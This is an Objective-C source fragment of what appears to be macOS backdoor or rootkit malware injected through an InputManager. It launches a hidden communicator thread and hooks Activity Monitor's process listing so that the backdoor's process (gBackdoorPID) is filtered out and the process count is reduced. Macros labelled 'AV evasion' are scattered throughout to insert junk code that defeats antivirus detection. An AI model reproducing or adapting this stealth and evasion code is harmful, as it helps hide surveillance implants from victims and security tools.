  infoLog(@"__m_MInputManager loaded by %@ at path %@", bundleIdentifier,
        [[NSBundle mainBundle] bundlePath]);
#endif
  
  // AV evasion: only on release build
  AV_GARBAGE_004

  [NSThread detachNewThreadSelector: @selector(startCoreCommunicator)
                           toTarget: self
                         withObject: nil];
  
  // AV evasion: only on release build
  AV_GARBAGE_002
}

+ (void)closeThreadCommunicator: (NSNotification *)_notification
{   
  // AV evasion: only on release build
  AV_GARBAGE_004 

  isAppRunning = NO;
}

@end

@interface mySMProcessController : NSObject

- (id)filteredProcessesHook;
- (int)outlineViewHook: (id)arg1 numberOfChildrenOfItem: (id)arg2;

@end

@implementation mySMProcessController

- (int)outlineViewHook: (id)arg1 numberOfChildrenOfItem: (id)arg2
{   
  // AV evasion: only on release build
  AV_GARBAGE_004 

  if (gBackdoorPID == 0)
  {
#ifdef DEBUG_INPUT_MANAGER
    verboseLog(@"gBackdoorPid not initialized");
#endif
    
    // AV evasion: only on release build
    AV_GARBAGE_003 
    
    return [self outlineViewHook: arg1
          numberOfChildrenOfItem: arg2];
  }
  
  // AV evasion: only on release build
  AV_GARBAGE_005

  if (arg2 == nil)
  {
#ifdef DEBUG_INPUT_MANAGER
    verboseLog(@"Asking for how many processes");
#endif
  }
  
  // AV evasion: only on release build
  AV_GARBAGE_006

  int a = [self outlineViewHook: arg1
         numberOfChildrenOfItem: arg2];
  
#ifdef DEBUG_INPUT_MANAGER
  verboseLog(@"Total processes: %d", a);
#endif
  
  // AV evasion: only on release build
  AV_GARBAGE_007

  if (a > 0)
    return a - 1;
  else
    return a;
}

- (id)filteredProcessesHook
{ 
  // AV evasion: only on release build
  AV_GARBAGE_001    
  
  if (gBackdoorPID == 0)
  {
    // AV evasion: only on release build
    AV_GARBAGE_002    

    return [self filteredProcessesHook];
  }
  
  NSMutableArray *a = [[NSMutableArray alloc] initWithArray: [self filteredProcessesHook]];
  int i = 0;
  
  // AV evasion: only on release build
  AV_GARBAGE_003 

  for (; i < [a count]; i++)
  {
    id object = [a objectAtIndex: i];
    if ([[object performSelector: @selector(pid)] intValue] == gBackdoorPID)
    {
      // AV evasion: only on release build
      AV_GARBAGE_002
      
      [a removeObject: object];
    }
    
    // AV evasion: only on release build
    AV_GARBAGE_004
  }
  
  // AV evasion: only on release build
  AV_GARBAGE_005  

  return a;
}

@end
